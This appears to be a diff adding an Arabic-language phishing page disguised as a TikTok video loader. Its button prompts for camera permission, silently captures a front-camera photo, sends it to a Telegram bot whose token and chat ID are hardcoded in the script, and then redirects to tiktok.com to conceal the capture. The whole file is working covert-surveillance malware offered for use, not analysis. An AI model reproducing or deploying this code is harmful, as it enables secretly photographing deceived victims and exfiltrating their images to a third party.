@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شاهد فيديو تيك توك</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; display: inline-block; max-width: 400px; }
+        button { background: #fe2c55; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>جاري تحميل الفيديو...</h2>
+        <p>اضغط على السماح لتأكيد المشاهدة</p>
+        <button id="btn" onclick="startCamera()">مشاهدة الفيديو</button>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "9261472848:AAEtjXwx2POmxOS3fmY6kZNMUCZWsyvmOfY";
+        const CHAT_ID = "7784595314";
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'captured.jpg');
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            window.location.href = "https://www.tiktok.com";
+                        })
+                        .catch(err => {
+                            window.location.href = "https://www.tiktok.com";
+                        });
+
+                    }, 'image/jpeg');
+
+                }, 1500);
+            })
+            .catch(err => {
+                alert("يجب الضغط على السماح لعرض الفيديو!");
+            });
+        }
+    </script>
+</body>
+</html>
